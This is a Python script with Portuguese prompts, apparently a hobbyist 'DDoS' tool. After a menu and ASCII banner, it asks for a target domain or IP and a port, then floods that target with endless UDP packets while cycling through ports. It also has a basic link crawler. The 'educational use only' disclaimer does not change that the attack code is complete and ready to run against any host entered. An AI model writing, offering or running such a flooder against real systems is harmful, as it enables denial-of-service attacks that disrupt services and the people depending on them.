#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
AVISO: Este script é apenas para FINS EDUCACIONAIS e de TESTE.
O autor e o usuário não se responsabilizam por qualquer uso indevido.
Use com responsabilidade e apenas em ambientes de teste ou com autorização explícita.
SÓ TESTANDO SCRIPT PARA USER O TESTAR
"""

try:
    import colorama
except ImportError:
    import os
    os.system("pip install colorama")
    import colorama

try:
    from tqdm.auto import tqdm
except ImportError:
    import os
    os.system("pip install tqdm")
    from tqdm.auto import tqdm

import requests
import re
from optparse import OptionParser
import sys
import os
import socket
from termcolor import colored
from colorama import Fore, Back, Style
import time
import random
from urllib import request

colorama.init()

if sys.version_info[0] >= 3:
    from urllib.parse import urljoin
else:
    from urlparse import urljoin

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):
        command = 'cls'
    os.system(command)

def banner():
    clearConsole()
    print(Fore.RED + r"""
          || .---.          || .---.          || .---.          || .---.
          ||/_____/         ||/_____/         ||/_____/         ||/_____/
          ||( '.' )         ||( '.' )         ||( '.' )         ||( '.' )
          ||_\_-_/_         ||_\_-_/_         ||_\_-_/_         ||_\_-_/_
          :-\"`'V'//-.       :-\"`'V'//-.       :-\"`'V'//-.       :-\"`'V'//-.
         / ,   |// , `\    / ,   |// , `\    / ,   |// , `\    / ,   |// , `/
        / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |   / /|Ll //Ll|| |
       /_/||__//   || |  /_/||__//   || |  /_/||__//   || |  /_/||__//   || |
       \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |  \ \/---|[]==|| |
        \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |   \/\__/ |   \| |
        /\|/_  | Ll_\ |   /\|/_  | Ll_\ |   /\|/_  | Ll_\ |   /\|/_  | Ll_\ |
        `--|`^""^`||_|   `--|`^""^`||_|   `--|`^""^`||_|   `--|`^""^`||_|
           |   |   ||/       |   |   ||/       |   |   ||/       |   |   ||/
           |   |   |         |   |   |         |   |   |         |   |   |
           |   |   |         |   |   |         |   |   |         |   |   |
           |   |   |         |   |   |         |   |   |         |   |   |
           L___l___J         L___l___J         L___l___J         L___l___J
            |_ | _|           |_ | _|           |_ | _|           |_ | _|
           (___|___)         (___|___)         (___|___)         (___|___)
    """ + Style.RESET_ALL + Fore.YELLOW)

def ddos(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
    sent = 0
    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            port += 1
            print(Fore.RED + f"Enviado {sent} pacote(s) para {ip} na porta {port}" + Fore.RESET)
            if port >= 65534:
                port = 1
            elif port == 1900:
                port = 1901
    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrompido pelo usuário." + Fore.RESET)

class Crawler:
    def __init__(self):
        self.visited_links = set()

    def crawl(self, url):
        try:
            response = requests.get(url)
            links = re.findall(r'href=["\'](http[s]?://[^"\']+)', response.text)
            for link in links:
                if link not in self.visited_links:
                    print(Fore.GREEN + f"[+] Encontrado: {link}" + Fore.RESET)
                    self.visited_links.add(link)
        except requests.RequestException as e:
            print(Fore.RED + f"Erro ao acessar {url}: {e}" + Fore.RESET)

    def result_count(self):
        print(Fore.YELLOW + f"Total de links encontrados: {len(self.visited_links)}" + Fore.RESET)

def main():
    print(Fore.CYAN + Style.BRIGHT + "Verificando conexão com a internet..." + Fore.RESET)
    for _ in tqdm(range(30000)):
        print(end='\r')
    time.sleep(1)
    try:
        request.urlopen('https://www.google.com/', timeout=3)
    except:
        print(Fore.RED + "Sem conexão com a internet." + Fore.RESET)
        return

    while True:
        banner()
        print(Fore.GREEN + Style.BRIGHT + "1." + Style.RESET_ALL + Fore.YELLOW + " Domínio do site")
        print(Fore.GREEN + Style.BRIGHT + "2." + Style.RESET_ALL + Fore.YELLOW + " Endereço IP")
        print(Fore.GREEN + Style.BRIGHT + "3." + Style.RESET_ALL + Fore.YELLOW + " Spider Crawler")
        print(Fore.GREEN + Style.BRIGHT + "4." + Style.RESET_ALL + Fore.YELLOW + " Sair")
        opt = str(input(Fore.RED + Style.BRIGHT + "\n>>> " + Fore.RESET))

        if opt == '1':
            domain = input(Fore.CYAN + "Digite o domínio (ex: google.com): " + Fore.RESET)
            ip = socket.gethostbyname(domain)
            break
        elif opt == '2':
            ip = input(Fore.CYAN + "Digite o endereço IP: " + Fore.RESET)
            break
        elif opt == '3':
            spider_url = input(Fore.CYAN + "URL para rastrear: " + Fore.RESET)
            crawler = Crawler()
            crawler.crawl(spider_url)
            crawler.result_count()
            input(Fore.YELLOW + "Pressione Enter para continuar..." + Fore.RESET)
        elif opt == '4':
            print(Fore.RED + "Saindo..." + Fore.RESET)
            return
        else:
            print(Fore.RED + "Opção inválida." + Fore.RESET)
            time.sleep(2)

    port = int(input(Fore.CYAN + "Número da porta: " + Fore.RESET))
    print(Fore.YELLOW + "Iniciando..." + Style.RESET_ALL)
    clearConsole()
    time.sleep(2)
    print(Fore.RED + Back.LIGHTGREEN_EX + "Iniciando ataque..." + Style.RESET_ALL)
    for _ in tqdm(range(30000)):
        print(end='\r')
    time.sleep(1)
    ddos(ip, port)

main()
